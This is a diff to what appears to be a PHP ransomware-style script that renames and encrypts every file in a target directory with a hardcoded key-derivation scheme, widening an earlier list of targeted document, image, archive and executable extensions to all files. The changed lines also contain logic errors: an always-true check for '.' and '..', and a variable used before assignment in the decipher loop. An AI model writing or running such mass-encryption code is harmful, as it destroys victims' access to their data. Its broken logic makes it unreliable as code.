@@ -24,10 +24,12 @@ if(isset($argv[1], $argv[2], $argv[3]) && $argv[1] === 'cipher') {
 	$directory = $argv[2];
 	$key_iv = explode('.', $argv[3]);
 	if ($handle = opendir($directory)) { 
-    	while (false !== ($fileName = readdir($handle))) {     
-        	$newName = str_replace(['.php', '.html', '.exe', '.pdf', '.docx', '.xslt', '.png', '.jpg', '.gif', '.txt', '.zip', '.rar'], ".ciphered", $fileName); /** You could add extensions **/
-        	@rename($directory . $fileName, $directory . $newName);
-        	echo @cipher($directory . $newName, $directory . $newName, $encrypt_method, substr(md5("\x2D\xFC\xD8" . $key_iv[0], true), 0, 8), substr(md5("\x18\x3C\x58" . $key_iv[1], true) . md5("\x2D\xFC\xD8" . $key_iv[0], true), 0, 16));
+    	while (false !== ($fileName = readdir($handle))) {
+    		if($fileName != '..' || $fileName != '.') {
+    			$newName = $fileName . '.ciphered'; /** You could add extensions **/
+        		@rename($directory . $fileName, $directory . $newName);
+        		echo @cipher($directory . $newName, $directory . $newName, $encrypt_method, substr(md5("\x2D\xFC\xD8" . $key_iv[0], true), 0, 8), substr(md5("\x18\x3C\x58" . $key_iv[1], true) . md5("\x2D\xFC\xD8" . $key_iv[0], true), 0, 16));
+    		}
 
     	}
     closedir($handle);
@@ -42,7 +44,7 @@ if(isset($argv[1], $argv[2], $argv[3]) && $argv[1] === 'cipher') {
     		$pos = strpos($fileName, '.ciphered');
     		if ($pos !== false) {
     			@decipher($directory . $newName, $directory . $newName, $encrypt_method, substr(md5("\x2D\xFC\xD8" . $key_iv[0], true), 0, 8), substr(md5("\x18\x3C\x58" . $key_iv[1], true) . md5("\x2D\xFC\xD8" . $key_iv[0], true), 0, 16));
-        		$newName = str_replace('.ciphered', ".deciphered", $fileName); /** You could add extensions **/
+        		$newName = str_replace('.ciphered', "", $fileName); /** You could add extensions **/
         		@rename($directory . $fileName, $directory . $newName);
         		
         	}
